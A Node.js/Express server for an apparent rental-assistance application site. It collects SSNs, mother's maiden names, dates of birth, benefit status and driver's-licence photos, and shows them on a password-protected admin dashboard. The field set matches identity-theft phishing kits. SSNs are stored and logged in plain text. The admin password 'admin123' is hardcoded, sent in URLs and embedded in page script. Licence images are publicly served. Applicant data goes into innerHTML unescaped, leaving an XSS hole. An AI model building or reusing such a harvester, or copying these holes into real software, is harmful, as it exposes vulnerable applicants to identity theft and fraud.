const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// Create uploads directory
if (!fs.existsSync('uploads')) {
    fs.mkdirSync('uploads', { recursive: true });
}

// File upload setup
const storage = multer.diskStorage({
    destination: 'uploads/',
    filename: (req, file, cb) => {
        cb(null, Date.now() + path.extname(file.originalname));
    }
});
const upload = multer({ storage });

// Database setup
const db = new sqlite3.Database('./rental_assistance.db', (err) => {
    if (err) {
        console.error('❌ Database connection error:', err);
    } else {
        console.log('✅ Connected to database');
    }
});

// Verify table exists and has correct columns
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS applications (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        full_name TEXT NOT NULL,
        phone TEXT NOT NULL,
        email TEXT NOT NULL,
        dob TEXT NOT NULL,
        gender TEXT NOT NULL,
        age INTEGER NOT NULL,
        mothers_maiden_name TEXT,
        fathers_name TEXT,
        city TEXT NOT NULL,
        ssn TEXT NOT NULL,
        past_due_rent REAL NOT NULL,
        applied_before TEXT NOT NULL,
        receiving_ss TEXT NOT NULL,
        verified_idme TEXT NOT NULL,
        dl_front TEXT,
        dl_back TEXT,
        submitted_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`, (err) => {
        if (err) {
            console.error('❌ Table creation error:', err);
        } else {
            console.log('✅ Table verified/created');
        }
    });
});

// Public Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/survey', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'survey.html'));
});

app.get('/confirmation', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'confirmation.html'));
});

// Submit application - SIMPLE VERSION
app.post('/submit', upload.fields([{ name: 'dl_front' }, { name: 'dl_back' }]), (req, res) => {
    try {
        const data = req.body;
        
        // Validate required fields
        const requiredFields = ['full_name', 'phone', 'email', 'dob', 'gender', 'age', 
                               'city', 'ssn', 'past_due_rent', 'applied_before', 
                               'receiving_ss', 'verified_idme'];
        
        for (const field of requiredFields) {
            if (!data[field] || data[field].toString().trim() === '') {
                return res.status(400).json({ 
                    success: false, 
                    error: `Missing required field: ${field}` 
                });
            }
        }
        
        // Validate SSN format (optional but recommended)
        const ssnRegex = /^\d{3}-\d{2}-\d{4}$/;
        if (!ssnRegex.test(data.ssn)) {
            // Still accept it, just log
            console.log('Warning: SSN format might be incorrect:', data.ssn);
        }
        
        // Simple INSERT statement matching table columns
        const sql = `INSERT INTO applications (
            full_name, phone, email, dob, gender, age, 
            mothers_maiden_name, fathers_name, city, ssn, 
            past_due_rent, applied_before, receiving_ss, verified_idme, 
            dl_front, dl_back
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`;
        
        const params = [
            data.full_name.trim(),
            data.phone.trim(),
            data.email.trim().toLowerCase(),
            data.dob,
            data.gender,
            parseInt(data.age),
            data.mothers_maiden_name ? data.mothers_maiden_name.trim() : null,
            data.fathers_name ? data.fathers_name.trim() : null,
            data.city.trim(),
            data.ssn.trim(),  // Store plain SSN
            parseFloat(data.past_due_rent),
            data.applied_before,
            data.receiving_ss,
            data.verified_idme,
            req.files && req.files.dl_front ? req.files.dl_front[0].filename : null,
            req.files && req.files.dl_back ? req.files.dl_back[0].filename : null
        ];
        
        console.log('Inserting application with SSN:', data.ssn);
        
        db.run(sql, params, function(err) {
            if (err) {
                console.error('❌ Database insert error:', err);
                return res.status(500).json({ 
                    success: false, 
                    error: 'Failed to save application to database' 
                });
            }
            
            console.log('✅ Application saved successfully. ID:', this.lastID);
            res.json({ 
                success: true, 
                message: 'Application submitted successfully',
                applicationId: this.lastID
            });
        });
        
    } catch (error) {
        console.error('❌ Submission error:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error' 
        });
    }
});

// ===== ADMIN ROUTES =====

// Simple admin password (change this!)
const ADMIN_PASSWORD = 'admin123';

// Check admin access middleware
const requireAdmin = (req, res, next) => {
    const password = req.query.password || req.headers['x-admin-password'];
    
    if (password === ADMIN_PASSWORD) {
        next();
    } else {
        res.status(401).send(`
            <h1>Admin Access Required</h1>
            <p>Please enter the admin password:</p>
            <form method="GET">
                <input type="password" name="password" placeholder="Enter password">
                <button type="submit">Login</button>
            </form>
        `);
    }
};

// Admin Dashboard
app.get('/admin', requireAdmin, (req, res) => {
    const dashboardPath = path.join(__dirname, 'admin', 'dashboard.html');
    if (fs.existsSync(dashboardPath)) {
        res.sendFile(dashboardPath);
    } else {
        // Simple admin interface
        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Admin Dashboard</title>
                <style>
                    body { font-family: Arial; padding: 20px; }
                    table { border-collapse: collapse; width: 100%; }
                    th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
                    th { background-color: #f2f2f2; }
                </style>
            </head>
            <body>
                <h1>Admin Dashboard</h1>
                <div id="applications"></div>
                <script>
                    async function loadApplications() {
                        const response = await fetch('/api/admin/applications?password=${ADMIN_PASSWORD}');
                        const applications = await response.json();
                        
                        let html = '<h2>Applications (' + applications.length + ')</h2>';
                        if (applications.length > 0) {
                            html += '<table><tr><th>ID</th><th>Name</th><th>Email</th><th>SSN</th><th>Phone</th><th>Rent Due</th><th>Submitted</th></tr>';
                            applications.forEach(app => {
                                html += \`<tr>
                                    <td>\${app.id}</td>
                                    <td>\${app.full_name}</td>
                                    <td>\${app.email}</td>
                                    <td>\${app.ssn}</td>
                                    <td>\${app.phone}</td>
                                    <td>\$\${app.past_due_rent}</td>
                                    <td>\${new Date(app.submitted_at).toLocaleString()}</td>
                                </tr>\`;
                            });
                            html += '</table>';
                        } else {
                            html += '<p>No applications yet.</p>';
                        }
                        document.getElementById('applications').innerHTML = html;
                    }
                    loadApplications();
                    setInterval(loadApplications, 30000); // Refresh every 30 seconds
                </script>
            </body>
            </html>
        `);
    }
});

// Get all applications (admin only)
app.get('/api/admin/applications', requireAdmin, (req, res) => {
    db.all('SELECT * FROM applications ORDER BY submitted_at DESC', [], (err, rows) => {
        if (err) {
            console.error('❌ Database error:', err);
            return res.status(500).json({ error: err.message });
        }
        res.json(rows);
    });
});

// Get single application
app.get('/api/admin/applications/:id', requireAdmin, (req, res) => {
    db.get('SELECT * FROM applications WHERE id = ?', [req.params.id], (err, row) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        if (!row) {
            return res.status(404).json({ error: 'Application not found' });
        }
        res.json(row);
    });
});

// Search applications
app.get('/api/admin/search', requireAdmin, (req, res) => {
    const { q } = req.query;
    if (!q) {
        return res.status(400).json({ error: 'Search query required' });
    }
    
    const searchPattern = `%${q}%`;
    db.all(
        `SELECT * FROM applications 
         WHERE full_name LIKE ? OR email LIKE ? OR phone LIKE ? OR ssn LIKE ? OR city LIKE ?
         ORDER BY submitted_at DESC`,
        [searchPattern, searchPattern, searchPattern, searchPattern, searchPattern],
        (err, rows) => {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json(rows);
        }
    );
});

// Delete application
app.delete('/api/admin/applications/:id', requireAdmin, (req, res) => {
    db.run('DELETE FROM applications WHERE id = ?', [req.params.id], function(err) {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        if (this.changes === 0) {
            return res.status(404).json({ error: 'Application not found' });
        }
        res.json({ success: true, message: 'Application deleted' });
    });
});

// Get statistics
app.get('/api/admin/stats', requireAdmin, (req, res) => {
    db.get(`
        SELECT 
            COUNT(*) as total_applications,
            SUM(past_due_rent) as total_rent_owed,
            AVG(past_due_rent) as avg_rent_owed,
            COUNT(CASE WHEN receiving_ss = 'Yes' THEN 1 END) as receiving_social_security
        FROM applications
    `, [], (err, row) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        res.json(row);
    });
});

// Serve uploaded files
app.use('/uploads', express.static('uploads'));

// 404 handler
app.use((req, res) => {
    res.status(404).send('Page not found');
});

// Error handler
app.use((err, req, res, next) => {
    console.error('❌ Server error:', err);
    res.status(500).send('Something went wrong');
});

// Start server
app.listen(PORT, () => {
    console.log(`
🚀 Server running on http://localhost:${PORT}
🔐 Admin access: http://localhost:${PORT}/admin?password=${ADMIN_PASSWORD}
📁 Uploads: http://localhost:${PORT}/uploads
📊 Database: rental_assistance.db
`);
});